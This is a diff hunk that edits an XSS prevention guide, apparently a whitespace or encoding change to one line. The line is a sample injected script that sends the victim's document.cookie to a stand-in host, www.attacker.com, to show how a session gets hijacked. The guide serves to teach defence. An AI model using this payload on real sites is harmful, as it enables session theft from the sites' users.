@@ -35,7 +35,7 @@ Preventing XSS requires separation of untrusted data from active browser content
 The attacker modifies the 'CC’ parameter in the browser to:
 
 ```
-><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'.
+><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'.
 ```
 
 This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.
